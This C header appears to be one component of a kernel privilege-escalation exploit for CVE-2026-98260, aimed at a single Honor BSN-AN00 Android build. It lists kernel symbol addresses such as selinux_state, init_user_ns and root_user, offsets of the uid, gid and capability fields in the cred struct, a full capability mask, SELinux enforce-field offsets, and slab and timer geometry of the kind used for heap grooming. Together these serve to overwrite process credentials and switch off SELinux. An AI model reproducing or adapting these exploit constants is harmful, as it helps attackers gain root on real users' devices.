/* pc98260_target_61258b.h — CVE-2026-98260 per-build constants.
 *
 * Target: Honor BSN-AN00 (MagicOS 10.0.0.132 C00E130R101P3)
 *   kernel_release = 6.12.58-android16-6-g459a4285ccf8-abogki532718632-4k
 *   4K pages, VA_BITS=39
 *
 * Derived from:
 *   - boot.img kernel Image (SHA256 below)
 *   - vmlinux reconstructed with vmlinux-to-elf (129075 kallsyms)
 *   - prepare_creds / do_timer_create disassembly (BL call sites)
 *   - 6.12.58 g554 (MLY-AN00) geometry, confirmed by new prepare_creds:
 *       task->cred = 0x900, sizeof(struct cred) = 0xb8
 *
 * Never hand-edit without re-running the derivation.
 */
#ifndef PC98260_TARGET_61258B_H
#define PC98260_TARGET_61258B_H

#include <stdint.h>

#define TARGET_NAME          "honor-bsn-61258b"
#define TARGET_KERNEL        "6.12.58-android16-6-g459a4285ccf8-abogki532718632-4k"
#define TARGET_KERNEL_SHA256 "411d87a6841685733804207d13000683f85b10c9bda1ec0feed0a63480e1f20a"

/* ---- absolute addresses (link-time; add g_slide at runtime) ---------- */
#define LINK_SELINUX_STATE   UINT64_C(0xffffffc0827e7a20)  /* selinux_state */
#define LINK_INIT_USER_NS    UINT64_C(0xffffffc082572128)  /* init_user_ns */
#define LINK_ROOT_USER       UINT64_C(0xffffffc0825723a0)  /* root_user    */
#define LINK_INIT_GROUPS     UINT64_C(0xffffffc082573868)  /* init_groups  */
#define LINK_INIT_UCOUNTS    UINT64_C(0xffffffc082573d38)  /* init_ucounts */

/* ---- kprobe/tracepoint call sites (function-internal; NOT portable) ---
 * node[0] of the address is the instruction right after
 * `bl kmem_cache_alloc_noprof`; tracepoint records exactly this value.
 */
#define LINK_ALLOC_TIMER     UINT64_C(0xffffffc0805199e8)  /* do_timer_create+0xac */
#define LINK_ALLOC_CRED      UINT64_C(0xffffffc08019b950)  /* prepare_creds+0x2c  */
#define LINK_ALLOC_TASK      UINT64_C(0xffffffc0801d11d0)  /* copy_process+0x190 (unused) */

/* ---- struct geometry (same 6.12.58 BTF family) ---- */
#define GEO_TASK_CRED        0x900   /* task_struct.cred          */
#define GEO_TASK_REAL_CRED   0x8f8   /* task_struct.real_cred     */
#define GEO_TASK_COMM        0x910   /* task_struct.comm          */
#define GEO_KITIMER_IT       0x78    /* k_itimer.it (cpu_timer.node) */
#define GEO_KITIMER_SIZE     0x100   /* sizeof(k_itimer)          */
#define GEO_KITIMER_STRIDE   0x100   /* kmem_cache stride         */
#define GEO_CRED_SIZE        184     /* sizeof(struct cred)       */
#define GEO_CRED_ALLOC_SIZE  192     /* cred_jar object size      */
#define GEO_CRED_UID         0x8
#define GEO_CRED_GID         0xc
#define GEO_CRED_SUID        0x10
#define GEO_CRED_SGID        0x14
#define GEO_CRED_EUID        0x18
#define GEO_CRED_EGID        0x1c
#define GEO_CRED_FSUID       0x20
#define GEO_CRED_FSGID       0x24
#define GEO_CRED_CAP_INH     0x30
#define GEO_CRED_CAP_PERM    0x38
#define GEO_CRED_CAP_EFF     0x40
#define GEO_CRED_CAP_BSET    0x48
#define GEO_CRED_CAP_AMB     0x50
#define GEO_CRED_SECURITY    0x80
#define GEO_CRED_USER        0x88
#define GEO_CRED_USER_NS     0x90
#define GEO_SELINUX_ENFORCE  0
#define GEO_SELINUX_INIT     1
#define GEO_SELINUX_WRITE    (-7)
#define GEO_SELINUX_SIZE     0x80

/* ---- slab geometry (same 6.12.58 config; recheck on device) --------- */
#define GEO_TASK_OBJSIZE            5696
#define GEO_TASK_OBJ_PER_SLAB       5
#define GEO_TASK_SLAB_PAGES         8
#define GEO_POSIX_TIMER_OBJSIZE     256
#define GEO_POSIX_TIMER_OBJ_PER_SLAB 32
#define GEO_POSIX_TIMER_SLAB_ORDER  1
#define GEO_PAGE_SIZE               4096
#define GEO_FRAG_PAGE_SIZE          8192

/* ---- kernel addressing ---------------------------------------------- */
#define GEOM_PAGE_OFFSET     UINT64_C(0xffffff8000000000)
#define GEOM_VA_BITS         39
#define GEOM_MEMSTART_PFN    UINT64_C(0x80000)
#define GEOM_MEMSTART_ADDR   UINT64_C(0xffffffc08193a738) /* memstart_addr */

/* ---- privilege bitmask ---------------------------------------------- */
#define CAP_FULL             UINT64_C(0x1ffffffffff) /* cap_last_cap=40 */

/* ---- begin_new_exec cleanup offsets (audit; unused at runtime) ------ */
#define BNE_LINK              UINT64_C(0xffffffc0806c7ac0)
#define BNE_RELEASE_TASK_OFF  0x410
#define BNE_DOWN_READ_OFF     0x50c
#define BNE_TIMERS_EXIT_OFF   0x87c
#define BNE_EXIT_ITIMERS_OFF  0x88c

#endif /* PC98260_TARGET_61258B_H */
